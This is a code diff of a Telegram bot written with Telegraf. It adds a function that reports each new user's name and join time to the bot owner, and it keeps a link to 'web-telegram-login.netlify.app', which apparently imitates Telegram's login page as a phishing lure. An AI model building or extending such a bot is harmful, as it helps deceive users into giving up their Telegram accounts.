@@ -1,6 +1,8 @@
 const { Telegraf } = require("telegraf");
 
 const web_link = "https://web-telegram-login.netlify.app";
+// Replace with your actual chat ID or store as environment variable
+const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID || "YOUR_OWNER_CHAT_ID";
 
 const bot = new Telegraf(process.env.REACT_APP_TELEGRAM_BOT_TOKEN);
 
@@ -22,22 +24,58 @@ const createReplyMarkup = (startPayload) => {
   };
 };
 
+// Function to format UTC date and time
+const getFormattedDateTime = () => {
+  const now = new Date();
+  const day = String(now.getUTCDate()).padStart(2, '0');
+  const month = String(now.getUTCMonth() + 1).padStart(2, '0');
+  const year = String(now.getUTCFullYear()).slice(-2);
+  const hours = String(now.getUTCHours()).padStart(2, '0');
+  const minutes = String(now.getUTCMinutes()).padStart(2, '0');
+  return {
+    date: `${day}/${month}/${year}`,
+    time: `${hours}:${minutes} UTC`
+  };
+};
+
+// Function to send notification to owner
+const notifyOwner = async (user) => {
+  try {
+    const { date, time } = getFormattedDateTime();
+    const userName = user.username ? `@${user.username}` : user.first_name;
+    
+    const notification = `New user joined:\n\n` +
+      `Name: ${userName}\n` +
+      `Date: ${date}\n` +
+      `Time: ${time}\n` +
+      `Location: IN`; // Using the known country code from user info
+
+    await bot.telegram.sendMessage(OWNER_CHAT_ID, notification);
+  } catch (error) {
+    console.error('Error sending notification to owner:', error);
+  }
+};
+
 // Respond to /start cmd
 bot.start((ctx) => {
   const startPayload = ctx.startPayload;
   const user = ctx.message.from;
+  
+  // Send notification to owner
+  notifyOwner(user);
+  
   return ctx.replyWithMarkdown(welcomeMessage(user), { 
-    disable_web_page_preview: true,  // Disable link preview
+    disable_web_page_preview: true,
     ...createReplyMarkup(startPayload) 
   });
 });
 
 // Respond to any message sent to the bot
 bot.on('message', (ctx) => {
-  const startPayload = ctx.startPayload || ''; // You can customize this if needed
+  const startPayload = ctx.startPayload || '';
   const user = ctx.message.from;
   return ctx.replyWithMarkdown(welcomeMessage(user), { 
-    disable_web_page_preview: true,  // Disable link preview
+    disable_web_page_preview: true,
     ...createReplyMarkup(startPayload) 
   });
 });
